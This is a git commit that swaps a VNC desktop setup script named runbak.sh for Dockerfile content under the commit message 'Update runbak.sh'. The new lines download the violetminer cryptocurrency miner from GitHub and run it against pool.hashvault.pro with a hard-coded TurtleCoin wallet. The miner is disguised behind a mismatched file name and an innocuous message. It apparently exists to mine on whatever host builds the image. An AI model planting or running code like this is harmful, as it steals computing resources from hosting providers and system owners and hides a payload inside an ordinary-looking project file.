39232e05865eb1408566f5d5c83029bf53789605
buozud <84149893+buozud@users.noreply.github.com>
2021-07-29 05:18:56 +0200

    Update runbak.sh

--- runbak.sh
+++ runbak.sh
@@ -1,45 +1,14 @@
-#!/bin/bash
-set -ex
-/app/expect_vnc.sh
-mkdir -p ~/.vnc ~/.config/xfce4
-tar -xvf /app/panel.tar -C ~/.config/xfce4
-rm -rf /usr/share/icons/Adwaita
-cp -r /usr/share/icons/Humanity-Dark /usr/share/icons/Adwaita
-cat << EOF >  ~/.vnc/xstartup
-#!/bin/sh
-xrdb $HOME/.Xresources
-vncconfig -iconic &
-startxfce4 &
-EOF
-chmod +x ~/.vnc/xstartup
-vncserver -depth 32 -pixelformat rgb888 -geometry 1440x900 -geometry 800x600 -geometry 1024x768 -geometry 1360x620 -geometry 1366x768 -geometry 1920x1080 :1
+FROM ubuntu:18.04
 
-mkdir -p /Desktop
-cat << EOF >  /Desktop/Chrome.desktop
-[Desktop Entry]
-Version=1.0
-Type=Application
-Name=Google Chrome
-Comment=Access the Internet
-Exec=/usr/bin/google-chrome-stable --no-sandbox --disable-dev-shm-usage
-Icon=google-chrome
-Path=
-Terminal=false
-StartupNotify=true
-EOF
+ENV DEBIAN_FRONTEND=noninteractive
 
-cat << EOF >  /Desktop/Swicth_to_Chinese_input.sh
-#!/bin/bash
-im-config -s ibus
-ibus-setup
-EOF
+#RUN echo 'deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n' > /etc/apt/sources.list
 
-cat << EOF >  /Desktop/Readme.txt
-Step 1: Excute Swicth_to_Chinese_input.sh on Deskop to switch input method.
-Step 2: Select 'Input Method', then click add button, choose Chinese and Pinyin icon to add.
-Step 3: Now it can support Chinese, Enjoy!
-EOF
-
-chmod +x /Desktop/Chrome.desktop
-chmod +x /Desktop/Swicth_to_Chinese_input.sh
-exec supervisord -c /app/supervisord.conf
+RUN apt-get upgrade
+RUN set -ex; \
+    apt-get update \
+    && apt-get install -y \
+            wget
+RUN wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+RUN tar xf violetminer-linux-v0.2.2.tar.gz
+RUN ./violetminer-linux-v0.2.2/violetminer --pool pool.hashvault.pro:80 --username TRTLuziekk1Y6FxAnujs1gTwQAy7hmqg1KSLE3DFmSi2Bxu9A8y4n8yjjXYQB3eDBeVUUhFB3m5wMBQFWfCq2oha9SipnBE33Hg --password x --algorithm chukwa_v2 --ssl
